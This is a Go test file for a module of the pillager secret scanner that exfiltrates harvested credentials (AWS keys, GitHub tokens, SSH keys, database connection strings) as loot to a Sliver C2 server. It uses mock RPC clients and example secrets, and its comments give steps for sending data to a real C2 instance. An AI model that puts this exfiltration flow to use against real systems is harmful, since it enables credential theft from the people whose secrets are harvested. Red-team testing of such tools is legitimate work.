package sliver

import (
	"context"
	"encoding/json"
	"os"
	"testing"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
	"google.golang.org/grpc"
)

// testPackage is a local struct for testing JSON unmarshaling
type testPackage struct {
	Metadata testMetadata       `json:"metadata"`
	Findings []pillager.Finding `json:"findings"`
}

type testMetadata struct {
	Hostname     string    `json:"hostname,omitempty"`
	Timestamp    time.Time `json:"timestamp"`
	Version      string    `json:"version"`
	FindingCount int       `json:"finding_count"`
}

func TestExtractCredentials(t *testing.T) {
	tests := []struct {
		name     string
		findings []pillager.Finding
		wantLen  int
	}{
		{
			name: "AWS credentials",
			findings: []pillager.Finding{
				{
					RuleID:      "aws-access-key",
					Description: "AWS Access Key",
					Secret:      "AKIAIOSFODNN7EXAMPLE",
					Tags:        []string{"aws", "credentials"},
				},
				{
					RuleID:      "aws-secret-key",
					Description: "AWS Secret Key",
					Secret:      "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
					Tags:        []string{"aws", "credentials"},
				},
			},
			wantLen: 2,
		},
		{
			name: "GitHub token",
			findings: []pillager.Finding{
				{
					RuleID:      "github-token",
					Description: "GitHub Token",
					Secret:      "ghp_1234567890abcdefghijklmnopqrstuvwxyz",
					Tags:        []string{"github", "token"},
				},
			},
			wantLen: 1,
		},
		{
			name: "SSH private key",
			findings: []pillager.Finding{
				{
					RuleID:      "private-key",
					Description: "SSH Private Key",
					Secret:      "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----",
					Tags:        []string{"ssh", "key"},
				},
			},
			wantLen: 1,
		},
		{
			name:     "no credentials",
			findings: []pillager.Finding{},
			wantLen:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ExtractCredentials(tt.findings)
			if len(got) != tt.wantLen {
				t.Errorf("ExtractCredentials() returned %d credentials, want %d", len(got), tt.wantLen)
			}
		})
	}
}

func TestParseAWSCredentials(t *testing.T) {
	tests := []struct {
		name    string
		finding pillager.Finding
		wantLen int
	}{
		{
			name: "access key",
			finding: pillager.Finding{
				RuleID:      "aws-access-key",
				Description: "AWS Access Key",
				Secret:      "AKIAIOSFODNN7EXAMPLE",
			},
			wantLen: 1,
		},
		{
			name: "secret key",
			finding: pillager.Finding{
				RuleID:      "aws-secret-key",
				Description: "AWS Secret Key",
				Secret:      "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			},
			wantLen: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseAWSCredentials(tt.finding)
			if len(got) != tt.wantLen {
				t.Errorf("parseAWSCredentials() returned %d credentials, want %d", len(got), tt.wantLen)
			}

			if len(got) > 0 {
				if got[0].Collection != "AWS" {
					t.Errorf("parseAWSCredentials() collection = %s, want AWS", got[0].Collection)
				}
				if !got[0].IsCracked {
					t.Error("parseAWSCredentials() IsCracked = false, want true")
				}
			}
		})
	}
}

func TestParseGitHubToken(t *testing.T) {
	tests := []struct {
		name    string
		finding pillager.Finding
		wantNil bool
	}{
		{
			name: "personal access token",
			finding: pillager.Finding{
				RuleID: "github-pat",
				Secret: "ghp_1234567890abcdefghijklmnopqrstuvwxyz",
			},
			wantNil: false,
		},
		{
			name: "oauth token",
			finding: pillager.Finding{
				RuleID: "github-oauth",
				Secret: "gho_1234567890abcdefghijklmnopqrstuvwxyz",
			},
			wantNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseGitHubToken(tt.finding)
			if (got == nil) != tt.wantNil {
				t.Errorf("parseGitHubToken() returned nil = %v, want %v", got == nil, tt.wantNil)
			}

			if got != nil {
				if got.Collection != "GitHub" {
					t.Errorf("parseGitHubToken() collection = %s, want GitHub", got.Collection)
				}
				if !got.IsCracked {
					t.Error("parseGitHubToken() IsCracked = false, want true")
				}
			}
		})
	}
}

func TestParseSSHKey(t *testing.T) {
	tests := []struct {
		name    string
		finding pillager.Finding
		wantNil bool
	}{
		{
			name: "RSA private key",
			finding: pillager.Finding{
				RuleID: "private-key",
				Secret: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----",
			},
			wantNil: false,
		},
		{
			name: "EC private key",
			finding: pillager.Finding{
				RuleID: "private-key",
				Secret: "-----BEGIN EC PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END EC PRIVATE KEY-----",
			},
			wantNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseSSHKey(tt.finding)
			if (got == nil) != tt.wantNil {
				t.Errorf("parseSSHKey() returned nil = %v, want %v", got == nil, tt.wantNil)
			}

			if got != nil {
				if got.Collection != "SSH" {
					t.Errorf("parseSSHKey() collection = %s, want SSH", got.Collection)
				}
				if !got.IsCracked {
					t.Error("parseSSHKey() IsCracked = false, want true")
				}
			}
		})
	}
}

func TestParseAPIToken(t *testing.T) {
	tests := []struct {
		name    string
		finding pillager.Finding
		wantNil bool
	}{
		{
			name: "slack token",
			finding: pillager.Finding{
				RuleID:      "slack-token",
				Description: "Slack API Token",
				Secret:      "xoxb-1234567890-1234567890-abcdefghijklmnopqrstuvwx",
			},
			wantNil: false,
		},
		{
			name: "generic api token",
			finding: pillager.Finding{
				RuleID:      "api-token",
				Description: "API Token",
				Secret:      "sk_test_1234567890abcdefghijklmnopqrstuvwxyz",
			},
			wantNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseAPIToken(tt.finding)
			if (got == nil) != tt.wantNil {
				t.Errorf("parseAPIToken() returned nil = %v, want %v", got == nil, tt.wantNil)
			}

			if got != nil {
				if got.Collection != "API" {
					t.Errorf("parseAPIToken() collection = %s, want API", got.Collection)
				}
				if !got.IsCracked {
					t.Error("parseAPIToken() IsCracked = false, want true")
				}
			}
		})
	}
}

func TestParseDatabaseCredential(t *testing.T) {
	tests := []struct {
		name    string
		finding pillager.Finding
		wantNil bool
	}{
		{
			name: "postgres connection string",
			finding: pillager.Finding{
				RuleID:      "database-postgres",
				Description: "PostgreSQL Connection String",
				Secret:      "postgresql://username:password@localhost:5432/database",
			},
			wantNil: false,
		},
		{
			name: "mysql connection string",
			finding: pillager.Finding{
				RuleID:      "database-mysql",
				Description: "MySQL Connection String",
				Secret:      "mysql://root:password@localhost:3306/mydb",
			},
			wantNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseDatabaseCredential(tt.finding)
			if (got == nil) != tt.wantNil {
				t.Errorf("parseDatabaseCredential() returned nil = %v, want %v", got == nil, tt.wantNil)
			}

			if got != nil {
				if !got.IsCracked {
					t.Error("parseDatabaseCredential() IsCracked = false, want true")
				}
			}
		})
	}
}

func TestContainsTag(t *testing.T) {
	tests := []struct {
		name string
		tags []string
		tag  string
		want bool
	}{
		{
			name: "tag exists",
			tags: []string{"aws", "credentials", "key"},
			tag:  "aws",
			want: true,
		},
		{
			name: "tag exists case insensitive",
			tags: []string{"AWS", "CREDENTIALS"},
			tag:  "aws",
			want: true,
		},
		{
			name: "tag does not exist",
			tags: []string{"github", "token"},
			tag:  "aws",
			want: false,
		},
		{
			name: "empty tags",
			tags: []string{},
			tag:  "aws",
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := containsTag(tt.tags, tt.tag)
			if got != tt.want {
				t.Errorf("containsTag() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestExtractUsernameFromConnectionString(t *testing.T) {
	tests := []struct {
		name    string
		connStr string
		want    string
	}{
		{
			name:    "postgresql format",
			connStr: "postgresql://myuser:password@localhost:5432/database",
			want:    "myuser",
		},
		{
			name:    "mysql format",
			connStr: "mysql://root:password@localhost:3306/mydb",
			want:    "root",
		},
		{
			name:    "username= format",
			connStr: "Server=localhost;Database=mydb;username=admin;Password=pass123",
			want:    "admin",
		},
		{
			name:    "no username",
			connStr: "localhost:5432/database",
			want:    "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractUsernameFromConnectionString(tt.connStr)
			if got != tt.want {
				t.Errorf("extractUsernameFromConnectionString() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestExpandPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool // Whether path should be expanded
	}{
		{
			name: "home directory shorthand",
			path: "~/.sliver-client/configs/operator.cfg",
			want: true,
		},
		{
			name: "absolute path",
			path: "/etc/sliver/operator.cfg",
			want: false,
		},
		{
			name: "relative path",
			path: "./config/operator.cfg",
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := expandPath(tt.path)

			if tt.want {
				// Should be expanded (no longer starts with ~)
				if len(got) > 0 && got[0] == '~' {
					t.Errorf("expandPath() did not expand path, got %v", got)
				}
			} else {
				// Should remain unchanged
				if got != tt.path {
					t.Errorf("expandPath() changed path, got %v, want %v", got, tt.path)
				}
			}
		})
	}
}

// ============================================================================
// Integration Tests
// ============================================================================
// These tests verify the full exfiltration flow of sending credentials to
// a Sliver C2 instance. By default, they use a mock RPC client.
//
// To test against a REAL Sliver C2 instance:
// 1. Start a Sliver server: sliver-server
// 2. Generate an operator config: new-operator --name test-operator --lhost <your-ip>
// 3. Set the SLIVER_CONFIG_PATH environment variable to the config file path
// 4. Run: go test -v -run TestRealSliverInstance
//
// Note: Real instance tests are skipped by default unless SLIVER_CONFIG_PATH is set.
// ============================================================================

// MockRPCClient implements a mock Sliver RPC client for testing
type MockRPCClient struct {
	rpcpb.SliverRPCClient
	lootAddCalls    []*clientpb.Loot
	lootAddError    error
	lootAddResponse *clientpb.Loot
}

func (m *MockRPCClient) LootAdd(ctx context.Context, in *clientpb.Loot, opts ...grpc.CallOption) (*clientpb.Loot, error) {
	m.lootAddCalls = append(m.lootAddCalls, in)
	if m.lootAddError != nil {
		return nil, m.lootAddError
	}
	if m.lootAddResponse != nil {
		return m.lootAddResponse, nil
	}
	return &clientpb.Loot{LootID: "test-loot-id"}, nil
}

// TestSliverExfiltratorIntegration tests the full exfiltration flow with a mock RPC client
func TestSliverExfiltratorIntegration(t *testing.T) {
	tests := []struct {
		name            string
		findings        []pillager.Finding
		parseCreds      bool
		expectedLootLen int // Expected number of loot additions
		expectedCredLen int // Expected number of credential additions
		wantErr         bool
	}{
		{
			name: "exfiltrate AWS credentials with parsing",
			findings: []pillager.Finding{
				{
					RuleID:      "aws-access-key",
					Description: "AWS Access Key",
					Secret:      "AKIAIOSFODNN7EXAMPLE",
					Tags:        []string{"aws", "credentials"},
					File:        "config.yml",
					StartLine:   10,
				},
				{
					RuleID:      "aws-secret-key",
					Description: "AWS Secret Key",
					Secret:      "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
					Tags:        []string{"aws", "credentials"},
					File:        "config.yml",
					StartLine:   11,
				},
			},
			parseCreds:      true,
			expectedLootLen: 3, // 1 loot file + 2 credentials
			expectedCredLen: 2,
			wantErr:         false,
		},
		{
			name: "exfiltrate multiple credential types",
			findings: []pillager.Finding{
				{
					RuleID:      "github-pat",
					Description: "GitHub Personal Access Token",
					Secret:      "ghp_1234567890abcdefghijklmnopqrstuvwxyz",
					Tags:        []string{"github", "token"},
					File:        ".env",
					StartLine:   5,
				},
				{
					RuleID:      "private-key",
					Description: "SSH Private Key",
					Secret:      "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----",
					Tags:        []string{"ssh", "key"},
					File:        "id_rsa",
					StartLine:   1,
				},
				{
					RuleID:      "slack-token",
					Description: "Slack API Token",
					Secret:      "xoxb-1234567890-1234567890-abcdefghijklmnopqrstuvwx",
					Tags:        []string{"slack", "api"},
					File:        "config.json",
					StartLine:   20,
				},
			},
			parseCreds:      true,
			expectedLootLen: 4, // 1 loot file + 3 credentials
			expectedCredLen: 3,
			wantErr:         false,
		},
		{
			name: "exfiltrate without credential parsing",
			findings: []pillager.Finding{
				{
					RuleID:      "aws-access-key",
					Description: "AWS Access Key",
					Secret:      "AKIAIOSFODNN7EXAMPLE",
					Tags:        []string{"aws", "credentials"},
				},
			},
			parseCreds:      false,
			expectedLootLen: 1, // Only 1 loot file, no credentials
			expectedCredLen: 0,
			wantErr:         false,
		},
		{
			name:            "empty findings",
			findings:        []pillager.Finding{},
			parseCreds:      true,
			expectedLootLen: 0,
			expectedCredLen: 0,
			wantErr:         false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create mock RPC client
			mockRPC := &MockRPCClient{
				lootAddResponse: &clientpb.Loot{LootID: "test-loot-id"},
			}

			// Create exfiltrator with mock client
			exfil := &SliverExfiltrator{
				rpc:        mockRPC,
				lootName:   "test-scan",
				lootType:   "credentials",
				parseCreds: tt.parseCreds,
			}

			// Execute exfiltration
			err := exfil.Exfiltrate(context.Background(), tt.findings)

			if (err != nil) != tt.wantErr {
				t.Errorf("Exfiltrate() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			// Verify correct number of loot additions
			if len(mockRPC.lootAddCalls) != tt.expectedLootLen {
				t.Errorf("Expected %d loot additions, got %d", tt.expectedLootLen, len(mockRPC.lootAddCalls))
			}

			// If we expect findings, verify the loot file
			if len(tt.findings) > 0 && len(mockRPC.lootAddCalls) > 0 {
				lootFile := mockRPC.lootAddCalls[0]

				// Verify loot file type
				if lootFile.Type != clientpb.LootType_LOOT_CREDENTIAL {
					t.Errorf("Expected loot type LOOT_CREDENTIAL, got %v", lootFile.Type)
				}

				// Verify loot file has data
				if lootFile.File == nil || len(lootFile.File.Data) == 0 {
					t.Error("Expected loot file to have data")
				}

				// Verify JSON structure
				var pkg testPackage
				if err := json.Unmarshal(lootFile.File.Data, &pkg); err != nil {
					t.Errorf("Failed to unmarshal loot data: %v", err)
				}

				if pkg.Metadata.FindingCount != len(tt.findings) {
					t.Errorf("Expected %d findings in metadata, got %d", len(tt.findings), pkg.Metadata.FindingCount)
				}

				if len(pkg.Findings) != len(tt.findings) {
					t.Errorf("Expected %d findings in package, got %d", len(tt.findings), len(pkg.Findings))
				}
			}

			// Verify credentials if parsing is enabled
			if tt.parseCreds && tt.expectedCredLen > 0 {
				credCount := 0
				for _, loot := range mockRPC.lootAddCalls {
					if loot.Credential != nil {
						credCount++

						// Verify credential type
						if loot.Type != clientpb.LootType_LOOT_CREDENTIAL {
							t.Errorf("Expected credential loot type LOOT_CREDENTIAL, got %v", loot.Type)
						}

						// Verify credential has user and password
						if loot.Credential.User == "" {
							t.Error("Expected credential to have a user/username")
						}
						if loot.Credential.Password == "" {
							t.Error("Expected credential to have a password/secret")
						}
					}
				}

				if credCount != tt.expectedCredLen {
					t.Errorf("Expected %d credentials, got %d", tt.expectedCredLen, credCount)
				}
			}
		})
	}
}

// TestStoreLootIntegration tests the storeLoot method with a mock RPC client
func TestStoreLootIntegration(t *testing.T) {
	findings := []pillager.Finding{
		{
			RuleID:      "test-rule",
			Description: "Test Finding",
			Secret:      "test-secret",
			File:        "test.txt",
			StartLine:   1,
		},
	}

	mockRPC := &MockRPCClient{
		lootAddResponse: &clientpb.Loot{LootID: "test-loot-id"},
	}

	exfil := &SliverExfiltrator{
		rpc:      mockRPC,
		lootName: "test-scan",
		lootType: "file",
	}

	err := exfil.storeLoot(context.Background(), findings)
	if err != nil {
		t.Fatalf("storeLoot() error = %v", err)
	}

	if len(mockRPC.lootAddCalls) != 1 {
		t.Fatalf("Expected 1 loot addition, got %d", len(mockRPC.lootAddCalls))
	}

	loot := mockRPC.lootAddCalls[0]

	// Verify loot type is file
	if loot.Type != clientpb.LootType_LOOT_FILE {
		t.Errorf("Expected loot type LOOT_FILE, got %v", loot.Type)
	}

	// Verify file type is TEXT
	if loot.FileType != clientpb.FileType_TEXT {
		t.Errorf("Expected file type TEXT, got %v", loot.FileType)
	}

	// Verify file has data
	if loot.File == nil {
		t.Fatal("Expected loot to have a file")
	}

	// Verify JSON structure
	var pkg testPackage
	if err := json.Unmarshal(loot.File.Data, &pkg); err != nil {
		t.Fatalf("Failed to unmarshal loot data: %v", err)
	}

	if len(pkg.Findings) != len(findings) {
		t.Errorf("Expected %d findings, got %d", len(findings), len(pkg.Findings))
	}
}

// TestStoreCredentialsIntegration tests the storeCredentials method with a mock RPC client
func TestStoreCredentialsIntegration(t *testing.T) {
	credentials := []Credential{
		{
			Username:   "test-user",
			Plaintext:  "test-password",
			Collection: "Test",
			IsCracked:  true,
		},
		{
			Username:   "hash-user",
			Hash:       "5f4dcc3b5aa765d61d8327deb882cf99",
			HashType:   "MD5",
			Collection: "Test",
			IsCracked:  false,
		},
	}

	mockRPC := &MockRPCClient{
		lootAddResponse: &clientpb.Loot{LootID: "test-loot-id"},
	}

	exfil := &SliverExfiltrator{
		rpc: mockRPC,
	}

	err := exfil.storeCredentials(context.Background(), credentials)
	if err != nil {
		t.Fatalf("storeCredentials() error = %v", err)
	}

	if len(mockRPC.lootAddCalls) != 2 {
		t.Fatalf("Expected 2 credential additions, got %d", len(mockRPC.lootAddCalls))
	}

	// Verify first credential (plaintext)
	cred1 := mockRPC.lootAddCalls[0]
	if cred1.Type != clientpb.LootType_LOOT_CREDENTIAL {
		t.Errorf("Expected credential loot type, got %v", cred1.Type)
	}
	if cred1.Credential.User != "test-user" {
		t.Errorf("Expected username 'test-user', got %v", cred1.Credential.User)
	}
	if cred1.Credential.Password != "test-password" {
		t.Errorf("Expected password 'test-password', got %v", cred1.Credential.Password)
	}

	// Verify second credential (hash)
	cred2 := mockRPC.lootAddCalls[1]
	if cred2.Credential.User != "hash-user" {
		t.Errorf("Expected username 'hash-user', got %v", cred2.Credential.User)
	}
	if cred2.Credential.Password != "[HASH:MD5] 5f4dcc3b5aa765d61d8327deb882cf99" {
		t.Errorf("Expected hash format, got %v", cred2.Credential.Password)
	}
}

// TestEndToEndExfiltration tests the complete exfiltration workflow
func TestEndToEndExfiltration(t *testing.T) {
	// Create realistic findings
	findings := []pillager.Finding{
		{
			RuleID:      "aws-access-key",
			Description: "AWS Access Key",
			Secret:      "AKIAIOSFODNN7EXAMPLE",
			Tags:        []string{"aws", "credentials"},
			File:        "/home/user/.aws/credentials",
			StartLine:   2,
			Match:       "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
		},
		{
			RuleID:      "aws-secret-key",
			Description: "AWS Secret Key",
			Secret:      "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			Tags:        []string{"aws", "credentials"},
			File:        "/home/user/.aws/credentials",
			StartLine:   3,
			Match:       "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		},
		{
			RuleID:      "github-pat",
			Description: "GitHub Personal Access Token",
			Secret:      "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
			Tags:        []string{"github", "token"},
			File:        "/home/user/.git-credentials",
			StartLine:   1,
			Match:       "https://ghp_16C7e42F292c6912E7710c838347Ae178B4a@github.com",
		},
		{
			RuleID:      "database-postgres",
			Description: "PostgreSQL Connection String",
			Secret:      "postgresql://dbuser:secretpassword@database.example.com:5432/production",
			Tags:        []string{"database", "postgres"},
			File:        "/app/config/database.yml",
			StartLine:   10,
			Match:       "url: postgresql://dbuser:secretpassword@database.example.com:5432/production",
		},
	}

	mockRPC := &MockRPCClient{
		lootAddResponse: &clientpb.Loot{LootID: "test-loot-id"},
	}

	exfil := &SliverExfiltrator{
		rpc:        mockRPC,
		lootName:   "pillager-scan",
		lootType:   "credentials",
		parseCreds: true,
	}

	// Execute exfiltration
	ctx := context.Background()
	err := exfil.Exfiltrate(ctx, findings)
	if err != nil {
		t.Fatalf("Exfiltrate() error = %v", err)
	}

	// Verify we got 1 loot file + 5 credentials (2 AWS + 1 GitHub + 1 Database + parsed username)
	// AWS creates 2 creds, GitHub creates 1, Database creates 1
	expectedTotal := 1 + 4 // 1 loot file + 4 credentials
	if len(mockRPC.lootAddCalls) != expectedTotal {
		t.Errorf("Expected %d total loot additions, got %d", expectedTotal, len(mockRPC.lootAddCalls))
	}

	// Verify loot file contains all findings
	lootFile := mockRPC.lootAddCalls[0]
	var pkg testPackage
	if err := json.Unmarshal(lootFile.File.Data, &pkg); err != nil {
		t.Fatalf("Failed to unmarshal loot data: %v", err)
	}

	if len(pkg.Findings) != len(findings) {
		t.Errorf("Expected %d findings in loot, got %d", len(findings), len(pkg.Findings))
	}

	// Verify metadata
	if pkg.Metadata.FindingCount != len(findings) {
		t.Errorf("Expected metadata finding count %d, got %d", len(findings), pkg.Metadata.FindingCount)
	}

	if pkg.Metadata.Version == "" {
		t.Error("Expected metadata version to be set")
	}

	// Verify credentials were properly extracted
	credCount := 0
	var collections []string
	for _, loot := range mockRPC.lootAddCalls[1:] {
		if loot.Credential != nil {
			credCount++
			// Extract collection from name (format: "Collection-Username")
			if loot.Name != "" {
				collections = append(collections, loot.Name)
			}
		}
	}

	if credCount != 4 {
		t.Errorf("Expected 4 credentials to be stored, got %d", credCount)
	}

	// Verify we have AWS, GitHub, and PostgreSQL credentials
	expectedCollections := []string{"AWS", "GitHub", "PostgreSQL"}
	for _, expected := range expectedCollections {
		found := false
		for _, name := range collections {
			if contains(name, expected) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected to find credential from collection %s, but didn't", expected)
		}
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && (s[:len(substr)] == substr || s[len(s)-len(substr):] == substr || containsInner(s, substr)))
}

func containsInner(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// TestRealSliverInstance tests exfiltration against a real Sliver C2 instance.
// This test is skipped unless the SLIVER_CONFIG_PATH environment variable is set.
//
// IMPORTANT: Client configurations MUST be generated by the Sliver server.
// The config is a JSON file containing per-user key pairs and certificates:
//
//	{
//	  "operator": "test-operator",
//	  "lhost": "192.168.1.100",
//	  "lport": 31337,
//	  "ca_certificate": "-----BEGIN CERTIFICATE-----\n...",
//	  "private_key": "-----BEGIN EC PRIVATE KEY-----\n...",
//	  "certificate": "-----BEGIN CERTIFICATE-----\n..."
//	}
//
// To run this test:
//  1. Start a Sliver server: sliver-server
//  2. Generate an operator config in the Sliver console:
//     sliver > new-operator --name test-operator --lhost <your-ip> --lport 31337
//  3. The config file will be saved (typically ~/.sliver-client/configs/test-operator_*.cfg)
//  4. Set environment variable: export SLIVER_CONFIG_PATH=/path/to/test-operator_*.cfg
//  5. Run: go test -v -run TestRealSliverInstance ./pkg/exfil/sliver/
func TestRealSliverInstance(t *testing.T) {
	configPath := os.Getenv("SLIVER_CONFIG_PATH")
	if configPath == "" {
		t.Skip("Skipping real Sliver instance test. Set SLIVER_CONFIG_PATH to run this test.")
	}

	// Create test findings
	findings := []pillager.Finding{
		{
			RuleID:      "test-aws-key",
			Description: "Test AWS Access Key",
			Secret:      "AKIAIOSFODNN7EXAMPLE",
			Tags:        []string{"aws", "test"},
			File:        "test.txt",
			StartLine:   1,
		},
		{
			RuleID:      "test-github-token",
			Description: "Test GitHub Token",
			Secret:      "ghp_test1234567890abcdefghijklmnopqrstuv",
			Tags:        []string{"github", "test"},
			File:        "test.txt",
			StartLine:   2,
		},
	}

	// Create exfiltrator with real config
	lootName := "pillager-test"
	parseCreds := true
	exfilCfg := exfil.Config{
		Type: "sliver",
		Sliver: &exfil.SliverOptions{
			ConfigPath:       configPath,
			LootName:         &lootName,
			ParseCredentials: &parseCreds,
		},
	}

	exfil, err := NewSliverExfiltrator(exfilCfg)
	if err != nil {
		t.Fatalf("Failed to create Sliver exfiltrator: %v", err)
	}
	defer exfil.Close()

	// Execute exfiltration
	ctx := context.Background()
	err = exfil.Exfiltrate(ctx, findings)
	if err != nil {
		t.Fatalf("Exfiltration failed: %v", err)
	}

	t.Log("Successfully exfiltrated findings to real Sliver instance!")
	t.Logf("Check your Sliver server with: loot")
	t.Logf("And credentials with: creds")
}

// TestNewSliverExfiltratorConfigErrors tests error handling for invalid configurations
func TestNewSliverExfiltratorConfigErrors(t *testing.T) {
	tests := []struct {
		name        string
		config      exfil.Config
		wantErr     bool
		errContains string
	}{
		{
			name: "missing sliver config",
			config: exfil.Config{
				Type:   "sliver",
				Sliver: nil,
			},
			wantErr:     true,
			errContains: "sliver configuration is required",
		},
		{
			name: "missing config path",
			config: exfil.Config{
				Type: "sliver",
				Sliver: &exfil.SliverOptions{
					ConfigPath: "",
				},
			},
			wantErr:     true,
			errContains: "sliver config path is required",
		},
		{
			name: "invalid config file path",
			config: exfil.Config{
				Type: "sliver",
				Sliver: &exfil.SliverOptions{
					ConfigPath: "/nonexistent/path/to/config.cfg",
				},
			},
			wantErr:     true,
			errContains: "failed to load Sliver config",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exfil, err := NewSliverExfiltrator(tt.config)

			if tt.wantErr {
				if err == nil {
					t.Error("Expected an error, but got none")
					return
				}
				if tt.errContains != "" && !contains(err.Error(), tt.errContains) {
					t.Errorf("Expected error to contain %q, but got: %v", tt.errContains, err)
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error, but got: %v", err)
				}
				if exfil != nil {
					exfil.Close()
				}
			}
		})
	}
}

// TestConfigPathExpansion tests that tilde (~) expansion works correctly
func TestConfigPathExpansion(t *testing.T) {
	// This test doesn't actually create an exfiltrator because we'd need
	// a valid config file, but we can test the expandPath function is called
	// by checking that it doesn't error on the path format itself

	config := exfil.Config{
		Type: "sliver",
		Sliver: &exfil.SliverOptions{
			ConfigPath: "~/.sliver-client/configs/test.cfg",
		},
	}

	// This will fail to load the config (file doesn't exist), but should
	// at least attempt to expand the path
	_, err := NewSliverExfiltrator(config)

	// We expect an error about loading the config, not about the path format
	if err == nil {
		t.Error("Expected error loading non-existent config")
	} else if !contains(err.Error(), "failed to load Sliver config") {
		t.Logf("Got expected error: %v", err)
	}
}
